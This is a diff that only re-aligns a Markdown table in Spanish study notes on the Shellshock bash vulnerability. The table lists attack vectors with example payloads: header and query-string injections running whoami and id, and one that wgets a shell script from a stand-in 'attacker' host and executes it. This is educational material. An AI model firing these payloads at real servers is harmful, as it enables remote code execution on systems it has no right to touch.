@@ -29,13 +29,13 @@ Se explota principalmente en **CGI scripts web**, pero también puede afectar ot
 
 ## 3️⃣ Vectores de ataque comunes
 
-|Vector|Descripción|Ejemplo de payload|
-|---|---|---|
-|**HTTP Header Injection**|Inyectar payloads en headers que CGI procesa|`User-Agent: () { :;}; /bin/bash -c "whoami"`|
-|**Query string / GET parameters**|Inyección en variables exportadas a Bash|`http://target/cgi-bin/vuln.cgi?x=() { :;}; /bin/bash -c "id"`|
-|**POST requests / body variables**|Evade filtros que bloquean GET|Payload enviado en body como variable de entorno|
-|**RFI + Shellshock**|Combina Remote File Inclusion con Shellshock|`curl http://target/cgi-bin/vuln.cgi -H 'X-Remote: () { :;}; wget http://attacker/shell.sh -O /tmp/s.sh; bash /tmp/s.sh'`|
-|**Servicios de red**|DHCP, cron, scripts automáticos|Payload en archivos de configuración procesados por Bash|
+| Vector                             | Descripción                                  | Ejemplo de payload                                                                                                        |
+| ---------------------------------- | -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
+| **HTTP Header Injection**          | Inyectar payloads en headers que CGI procesa | `User-Agent: () { :;}; /bin/bash -c "whoami"`                                                                             |
+| **Query string / GET parameters**  | Inyección en variables exportadas a Bash     | `http://target/cgi-bin/vuln.cgi?x=() { :;}; /bin/bash -c "id"`                                                            |
+| **POST requests / body variables** | Evade filtros que bloquean GET               | Payload enviado en body como variable de entorno                                                                          |
+| **RFI + Shellshock**               | Combina Remote File Inclusion con Shellshock | `curl http://target/cgi-bin/vuln.cgi -H 'X-Remote: () { :;}; wget http://attacker/shell.sh -O /tmp/s.sh; bash /tmp/s.sh'` |
+| **Servicios de red**               | DHCP, cron, scripts automáticos              | Payload en archivos de configuración procesados por Bash                                                                  |
 
 ---
 
